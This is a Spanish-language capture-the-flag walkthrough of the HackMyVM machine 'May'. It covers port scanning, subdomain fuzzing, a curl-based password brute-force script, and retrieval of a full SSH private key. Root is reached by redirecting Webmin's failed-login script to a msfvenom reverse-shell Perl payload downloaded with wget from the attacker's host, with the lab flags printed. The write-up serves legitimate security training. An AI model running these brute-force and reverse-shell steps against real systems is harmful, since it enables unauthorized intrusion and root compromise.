---
icon: flag
---

# May HackMyVM (Intermediate - Linux)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-22 03:17 EDT
Nmap scan report for 192.168.1.160
Host is up (0.00046s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 94:fb:c0:76:f2:b3:ff:4a:ed:61:6a:ae:a1:ca:86:c1 (RSA)
|   256 d0:29:99:fd:69:68:21:e3:b4:a6:48:e4:4e:a1:7e:f4 (ECDSA)
|_  256 2a:1b:1f:3d:ab:0a:00:5b:43:75:89:67:8a:98:21:df (ED25519)
80/tcp    open  http    nginx 1.14.2
|_http-title: Did not follow redirect to http://may.hmv
|_http-server-header: nginx/1.14.2
10000/tcp open  http    MiniServ 1.979 (Webmin httpd)
|_http-title: 200 &mdash; Document follows
MAC Address: 08:00:27:A3:6D:B5 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.48 seconds
```

Veremos varias cosas interesantes, entre ellas el puerto `80` que aloja una pagina web, pero si entramos veremos que se esta resolviendo con un dominio llamado `may.hmv` por lo que tendremos que añadirlo a nuestro archivo `hosts`.

```shell
nano /etc/hosts

#Dentro del nano
<IP>   may.hmv
```

Lo guardamos y volveremos a cargar la pagina para que nos cargue el contenido.

```
URL = http://may.hmv/
```

Veremos lo siguiente cuando entremos:

```
admin: Web is under construction. Use Intranet.
marie: Where are now the keys?
alice: Yes, where are?
admin: :'(
```

Ya vemos `3` posibles usuarios, los cuales nos vamos a guardar en un archivo por si nos fuera necesario en un futuro utilizarlo:

> users.txt

```
admin
marie
alice
```

Pero no veremos nada interesante en la pagina, como tenemos un dominio, vamos a realizar un poco de `fuzzing` a ver si encontramos algun `subdominio` de la siguiente forma:¡

## FFUF

```shell
ffuf -c -t 200 -w <WORDLIST> -H "Host: FUZZ.may.hmv" -u http://may.hmv/ -fs 185
```

Info:

```

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://may.hmv/
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Header           : Host: FUZZ.may.hmv
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 185
________________________________________________

portal                  [Status: 200, Size: 406, Words: 50, Lines: 12, Duration: 14ms]
ssh                     [Status: 200, Size: 405, Words: 50, Lines: 11, Duration: 32ms]
:: Progress: [20469/20469] :: Job [1/1] :: 14084 req/sec :: Duration: [0:00:01] :: Errors: 0 ::
```

Veremos que hay `2` `subdominios` vamos a ver que contiene cada unos de ellos, pero antes vamos añadirlo a nuestro archivo `hosts`.

```shell
nano /etc/hosts

#Dentro del nano

<IP>   may.hmv portal.may.hmv ssh.may.hmv
```

Lo guardamos y ahora vamos a probar a entrar a ver que encontramos en los `2`, pero si entramos en cualquiera de los `2` veremos lo siguiente:

<figure><img src="../../.gitbook/assets/image (357).png" alt=""><figcaption></figcaption></figure>

Vamos a probar a realizar fuerza bruta con un script en `bash` de la siguiente forma:

Si nosotros capturamos la peticion con `BurpSuite` veremos lo siguiente:

```
POST /check.php HTTP/1.1
Host: portal.may.hmv
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 26
Origin: http://portal.may.hmv
Connection: keep-alive
Referer: http://portal.may.hmv/
Cookie: Sweetcookie=HMVHMXHMVHMXHMVHMXHMVHMX
Upgrade-Insecure-Requests: 1
Priority: u=0, i

user=marie&password=test
```

Vemos que se esta utilizando una `Cookie` por lo que vamos a crear el script de esta forma:

> forceWeb.sh

```bash
#!/bin/bash

while read pass; do
  resp=$(curl -s -i -X POST http://portal.may.hmv/check.php \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -H "Cookie: Sweetcookie=HMVHMXHMVHMXHMVHMXHMVHMX" \
    -d "user=marie&password=$pass")
  
  # Verifica si la respuesta contiene el mensaje de "user/pass incorrect."
  echo "$resp" | grep -q "user/pass incorrect." || echo "[+] Found: marie:$pass"
done < /usr/share/wordlists/rockyou.txt
```

Vamos a probar con el usuario `marie` si quisieramos con otro cambiamos el campo del `user` por el otro, pero en mi caso probare primero con el usuario `marie`, ahora lo ejecutaremos de la siguiente forma:

```shell
bash forceWeb.sh
```

Info:

```
[+] Found: marie:rebelde
```

Veremos que ha funcionado y hemos encontrado la contraseña de dicho usuario, ahora si entramos con dichas credenciales veremos lo siguiente:

```
Hi marie!Portal is under development too.Come back later
```

## Escalate user marie

No veremos nada interesante, pero si entramos en la que pone `ssh.may.hmv` y metemos las mismas credenciales veremos que no son validas, por lo que vamos a capturar la peticion a ver que esta pasando y veremos esto:

```
POST /check.php HTTP/1.1
Host: ssh.may.hmv
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 27
Origin: http://ssh.may.hmv
Connection: keep-alive
Referer: http://ssh.may.hmv/
Upgrade-Insecure-Requests: 1
Priority: u=0, i

user=marie&password=rebelde
```

Veremos que no se esta estableciendo la `Cookie` por lo que con la peticion interceptada, vamos a añadir dicho campo de la `Cookie` para que nos podamos `loguear` quedando de esta forma:

```
POST /check.php HTTP/1.1
Host: ssh.may.hmv
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 27
Origin: http://ssh.may.hmv
Connection: keep-alive
Referer: http://ssh.may.hmv/
Cookie: Sweetcookie=HMVHMXHMVHMXHMVHMXHMVHMX
Upgrade-Insecure-Requests: 1
Priority: u=0, i

user=marie&password=rebelde
```

Ahora si le damos a `enviar` veremos lo siguiente:

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEA3HwQ6G67tSrcxTN2oOKplVae0b+gVe0x/btFSgGJy2bMoWc14qBO
jE7cEcO8tEB85mI3ftByjp6ZVcQWdmEFvqDjeiGvucu0cnO/kTYZGue34/P0+3TJ4Dn92l
L5neeFJC37yHtgxGv1XZ3aQ6mN/XY6okPpjhECZieH8849P+vclhBsXcZPNwZ1vkXAinaY
T6e1vDJA94l4ioDgj/S48gFuR1OExpsxM+c1uggIcd/GgFyVHy7i/hdm78p09vnmWj8sw2
XUd8XGIJOZRHMx0xAw2ezkHC93buwL2KRxez9e5nsLMfKUYNBd7T/16AfS6lRvkvCBPAJs
aBOPbycNKQAAA8BCdu/2Qnbv9gAAAAdzc2gtcnNhAAABAQDcfBDobru1KtzFM3ag4qmVVp
7Rv6BV7TH9u0VKAYnLZsyhZzXioE6MTtwRw7y0QHzmYjd+0HKOnplVxBZ2YQW+oON6Ia+5
y7Ryc7+RNhka57fj8/T7dMngOf3aUvmd54UkLfvIe2DEa/VdndpDqY39djqiQ+mOEQJmJ4
fzzj0/69yWEGxdxk83BnW+RcCKdphPp7W8MkD3iXiKgOCP9LjyAW5HU4TGmzEz5zW6CAhx
38aAXJUfLuL+F2bvynT2+eZaPyzDZdR3xcYgk5lEczHTEDDZ7OQcL3du7AvYpHF7P17mew
sx8pRg0F3tP/XoB9LqVG+S8IE8AmxoE49vJw0pAAAAAwEAAQAAAQEAuDe81Mc4dG1Emkue
cVwQfuMpvWxTZZfSLgKbKPNSEy1oCe83OYvhNR/qhbk6YIyFDuS/I2i8XmcrDFrSvcPgzd
6VUYT10tHdiccmJwjBPxaeMYqyhKqWxY8Oh6zOPN2lA46cEWzsdBETqE1sgR4Ysc5nvQ3r
BTU3AO1EjTMjP9Sfo+GbbZq292h/WUlN3+34VngnTZg7RM2th4tk00sc07iiRLAh3DQ9Yo
7S8QWJQhVJAO/3UmhmsK8Sb44BJ/cYZd+SC6BV+RwsnrS+JyeUs1zctJzBSpxX6+9ko4oN
VGIWnYce1Jxrz1cxgwnEEsb2BnamTyRAJoWW4fU7NYzIkQAAAIANhgRfAVu6xVNyEXXOFg
263Uqp45OG8qhhONwk5wzJUE3GiD9mj1YZMYejEfTGoTwk2x9DAgQhk5cAAPrRJpC221NJ
72B0fllexMzO8RfizG345S04i40vjOgq+/iweU2+pRccJNFlRSZgKl8FJ1zmpP5fAQGQVo
NVgkzCDsu/MwAAAIEA8Q4y6353GpFasya8P60/8lOAl8RglmnS56Yt9kjdIBQvUVKDPPNP
qy9Ki3mJXLTbr+dPi2yaMTGr02rYVwGhLmykswXPQPzcdeuxt4ufYld8G3UgxNejsiYqWT
AkdYBaM6g2M/J/MWQY6WLhXMQhK75C6ZCbsrR3F8ffi0XF8TUAAACBAOonYvqdEgrAiYK/
l1iMe5oHRwklV/d5eEM/8bTl0MgDEhMYRLkmkuuhOb6rVIz3y3PVmE0zeQa2u6qj0stmLm
34pXoHjrR2KlUk5pvoXbcvm8TvnHypnIwls1QL5WsHMGNjt/AbboqLkA2m+v9IEEIww40w
8fGOoN87zX40QP6lAAAACW1hcmllQG1heQE=
-----END OPENSSH PRIVATE KEY-----
```

Vemos que ha funcionado de forma correcta, por lo que vamos a probar a meternos por `SSH` con el usuario `marie`.

Antes crearemos el archivo para meter nuestro `id_rsa`:

```shell
nano id_rsa

#Dentro del nano
<ID_RSA_MARIE>
```

Lo guardamos y le establecemos los permisos necesarios para que funcione.

```shell
chmod 600 id_rsa
```

Ahora si nos conectaremos por `SSH` mediante la clave `PEM` de la siguiente forma:

```shell
ssh -i id_rsa marie@may.hmv
```

Info:

```
The authenticity of host 'may.hmv (192.168.1.160)' can't be established.
ED25519 key fingerprint is SHA256:QSSSqXZeR4OvUa7yWVlVa56SdGhd2InALjTGBAxu8QQ.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'may.hmv' (ED25519) to the list of known hosts.
Linux may 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Jul 22 03:34:48 2021
marie@may:~$ whoami
marie
```

Y con esto estaremos dentro de la maquina con dicho usuario, por lo que leeremos la `flag` del usuario.

> user.txt

```
HMVmarieisrebel
```

## Escalate Privielges

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for marie on may:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User marie may run the following commands on may:
    (ALL) NOPASSWD: /usr/sbin/halt, /usr/sbin/reboot, /usr/sbin/poweroff
```

Pero no podremos hacer gran cosa con esto, por lo que vamos a seguir buscando.

Vamos a buscar archivos en los cuales pueda escribir omitiendo los que ya vienen por defecto, a ver que encontramos:

```shell
find / -type f -writable ! -path "/proc/*" ! -path "/sys/*" 2>/dev/null
```

Info:

```
/etc/webmin/miniserv.conf
/home/marie/.bashrc
/home/marie/user.txt
/home/marie/.profile
/home/marie/.ssh/id_rsa.pub
/home/marie/.ssh/authorized_keys
/home/marie/.ssh/id_rsa
/home/marie/.bash_logout
/home/marie/.Xauthority
```

Por lo que vemos, vemos un archivo muy interesante que es `miniserv.conf` el cual podemos escribir al parecer, asi que vamos a ver que contiene.

```shell
cat /etc/webmin/miniserv.conf
```

Info:

```
port=10000
root=/usr/share/webmin
mimetypes=/usr/share/webmin/mime.types
addtype_cgi=internal/cgi
realm=Webmin Server
logfile=/var/webmin/miniserv.log
errorlog=/var/webmin/miniserv.error
pidfile=/var/webmin/miniserv.pid
logtime=168
ssl=1
no_ssl2=1
no_ssl3=1
no_tls1=1
no_tls1_1=1
ssl_honorcipherorder=1
no_sslcompression=1
env_WEBMIN_CONFIG=/etc/webmin
env_WEBMIN_VAR=/var/webmin
atboot=1
logout=/etc/webmin/logout-flag
listen=10000
denyfile=\.pl$
log=1
blockhost_failures=5
blockhost_time=60
syslog=1
ipv6=1
session=1
premodules=WebminCore
server=MiniServ/1.979
userfile=/etc/webmin/miniserv.users
keyfile=/etc/webmin/miniserv.pem
passwd_file=/etc/shadow
passwd_uindex=0
passwd_pindex=1
passwd_cindex=2
passwd_mindex=4
passwd_mode=0
preroot=authentic-theme
passdelay=1
failed_script=/etc/webmin/failed.pl
logout_script=/etc/webmin/logout.pl
cipher_list_def=1
login_script=/etc/webmin/login.pl
sudo=1
```

Vemos que se esta ejecutando en el puerto `1000` que es el que vimos antes, es un `login`, tambien vemos esto:

```
failed_script=/etc/webmin/failed.pl
logout_script=/etc/webmin/logout.pl
cipher_list_def=1
login_script=/etc/webmin/login.pl
sudo=1
```

Vemos que cuando da un error en el `login` ejecuta el archivo `failed.pl` que esta en `perl` y se estaria ejecutando como `root` por lo que vamos aprovechar eso y vamos a generar un archivo en `perl` para realizar una `reverse shell` como `root`, pero antes tendremos que modificar dicha linea y redirigir esa ejeccucion a otro sitio en este caso en nuestra `home` dejando la linea de esta forma:

```
failed_script=/home/marie/failed.pl
```

Ahora si vamos a generar el `.pl`:

```shell
msfvenom -p cmd/unix/reverse_perl LHOST=<IP> LPORT=<PORT> -f raw > failed.pl
```

Una vez generado el archivo vamos abrir un servidor de `python3` para pasarnos el archivo a nuestra `home` del usuario, donde se va a ejecutar el `.pl`.

```shell
python3 -m http.server 80
```

Ahora en la maquina victima ejeuctaremos lo siguiente:

```shell
wget http://<IP_ATTACKER>/failed.pl
```

Le damos permisos de ejecuccion:

```shell
chmod +x failed.pl
```

Echo esto entraremos ya en la siguiente `URL`:

```
URL = https://<IP>:10000/
```

Antes de meter las credenciales mal, vamos a ponernos a la escucha:

```shell
nc -lvnp <PORT>
```

Ahora si metemos por ejemplo como credenciales:

```
User: test
Pass: test
```

No pondra que hemos fallado las credenciales, pero si volvemos a donde tenemos la escucha veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [192.168.1.146] from (UNKNOWN) [192.168.1.160] 33600
whoami
root
```

Veremos que ha funcionado, por lo que leeremos la `flag` de `root`.

> root.txt

```
HMVmaymaymay
```
